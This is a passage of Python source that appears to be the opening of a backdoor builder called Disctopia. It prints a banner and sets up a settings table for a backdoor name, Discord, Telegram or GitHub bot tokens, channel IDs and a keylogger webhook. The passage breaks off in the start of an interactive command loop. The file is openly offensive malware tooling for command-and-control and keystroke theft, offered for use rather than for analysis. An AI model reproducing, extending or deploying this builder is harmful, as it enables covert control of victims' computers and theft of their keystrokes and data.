import json
import subprocess
import os
from prettytable import PrettyTable
from sys import platform as OS
import requests
import time
import sys

def clear_screen():
    if OS == "linux" or OS == "linux2":
        os.system("clear")
    elif OS == "win32":
        os.system("cls")

clear_screen()

print('''
▓█████▄  ██▓  ██████  ▄████▄  ▄▄▄█████▓ ▒█████   ██▓███   ██▓ ▄▄▄
▒██▀ ██▌▓██▒▒██    ▒ ▒██▀ ▀█  ▓  ██▒ ▓▒▒██▒  ██▒▓██░  ██▒▓██▒▒████▄
░██   █▌▒██▒░ ▓██▄   ▒▓█    ▄ ▒ ▓██░ ▒░▒██░  ██▒▓██░ ██▓▒▒██▒▒██  ▀█▄
░▓█▄   ▌░██░  ▒   ██▒▒▓▓▄ ▄██▒░ ▓██▓ ░ ▒██   ██░▒██▄█▓▒ ▒░██░░██▄▄▄▄██
░▒████▓ ░██░▒██████▒▒▒ ▓███▀ ░  ▒██▒ ░ ░ ████▓▒░▒██▒ ░  ░░██░ ▓█   ▓██▒
 ▒▒▓  ▒ ░▓  ▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░  ▒ ░░   ░ ▒░▒░▒░ ▒▓▒░ ░  ░░▓   ▒▒   ▓▒█░
 ░ ▒  ▒  ▒ ░░ ░▒  ░ ░  ░  ▒       ░      ░ ▒ ▒░ ░▒ ░      ▒ ░  ▒   ▒▒ ░
 ░ ░  ░  ▒ ░░  ░  ░  ░          ░      ░ ░ ░ ▒  ░░        ▒ ░  ░   ▒
 ░ ░  ░  ▒ ░░  ░  ░  ░          ░      ░ ░ ░ ▒  ░░        ▒ ░  ░   ▒
   ░     ░        ░  ░ ░                   ░ ░            ░        ░  ░ v2.1.2
 ░                   ░                                                  ''')

list = ["None", "None", "None", "None", "None"]

def createTable(list):
    table = PrettyTable(["Setting", "Value"])
    table.add_row(["Backdoor Name", list[0]])

    if payload == "discord":
        table.add_row(["Guild ID", list[1]])
        table.add_row(["Bot Token", list[2]])
        table.add_row(["Channel ID", list[3]])
        table.add_row(["Keylogger Webhook", list[4]])
    elif payload == "telegram":
        table.add_row(["User ID", list[1]])
        table.add_row(["Bot Token", list[2]])
    elif payload == "github":
        table.add_row(["Github Token", list[1]])
        table.add_row(["Github Repo", list[2]])
    else:
        print("[!] Please select a payload!\n")
    return table

payload = ""
try:
    while True:

        command = input(f"[+] {payload} > ")
        command_list = command.split()

        if command_list == []:
            continue